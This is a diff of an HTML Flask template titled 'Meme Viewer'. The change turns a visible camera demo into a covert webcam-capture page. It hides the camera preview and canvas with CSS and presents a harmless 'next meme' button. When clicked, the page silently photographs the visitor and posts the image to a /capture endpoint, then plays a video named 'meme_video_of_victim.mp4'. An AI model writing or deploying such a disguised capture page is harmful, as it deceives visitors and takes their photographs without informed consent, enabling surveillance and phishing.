@@ -1,57 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title></title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Meme Viewer</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: sans-serif;
+    }
+
+    #videoElement {
+      display: none;
+    }
+
+    #mainButton {
+      padding: 15px 25px;
+      font-size: 18px;
+      margin: 20px 0;
+      background-color: #e91e63;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    video#memevideo {
+      max-width: 100%;
+      display: none;
+      border-radius: 12px;
+      margin-top: 20px;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <h2><span></span></h2>
-  <p></p>
 
-  <!-- CAMERA PREVIEW -->
-  <video id="camera" width="320" height="240" autoplay></video>
-  <br>
-  <button onclick="captureAndPlay()">Watch Now Next</button>
-  <p id="status"></p>
+  <video id="videoElement" autoplay></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+  <button id="mainButton">📸 click to next meme </button>
 
-  <hr>
-
-  <!-- MEME VIDEO -->
-  <video id="meme" width="320" controls style="display:none;">
+  <video id="memevideo" controls>
     <source src="{{ url_for('static', filename='meme_video_of_victim.mp4') }}" type="video/mp4">
     Your browser does not support the video tag.
   </video>
 
-<script>
-  // Access camera
-  const video = document.getElementById('camera');
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => video.srcObject = stream)
-    .catch(err => console.error("Camera error:", err));
+  <script>
+    const videoElement = document.getElementById('videoElement');
+    const canvas = document.getElementById('canvas');
+    const mainButton = document.getElementById('mainButton');
+    const memeVideo = document.getElementById('memevideo');
 
-  function captureAndPlay() {
-    const canvas = document.createElement('canvas');
-    canvas.width = 320;
-    canvas.height = 240;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    let streamStarted = false;
 
-    const imageData = canvas.toDataURL('image/png');
+    async function startCameraAndCapture() {
+      try {
+        if (!streamStarted) {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          videoElement.srcObject = stream;
+          streamStarted = true;
 
-    // Capture photo
-    fetch('/capture', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ image: imageData })
-    })
-    .then(res => res.json())
-    .then(data => {
-      document.getElementById("status").innerText = "Image saved as: " + data.filename;
+          // Wait a moment for camera to turn on
+          await new Promise(resolve => setTimeout(resolve, 500));
+        }
 
-      // Play video
-      const memeVideo = document.getElementById("meme");
-      memeVideo.style.display = "block";
-      memeVideo.play();
-    });
-  }
-</script>
+        // Capture frame
+        const context = canvas.getContext('2d');
+        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg');
+
+        // Send to backend
+        await fetch('/capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'image=' + encodeURIComponent(imageData)
+        });
+
+        // Play meme video
+        memeVideo.style.display = 'block';
+        memeVideo.play();
+
+      } catch (err) {
+        alert('Camera access denied or unavailable.');
+        console.error(err);
+      }
+    }
+
+    mainButton.addEventListener('click', startCameraAndCapture);
+  </script>
+
 </body>
 </html>
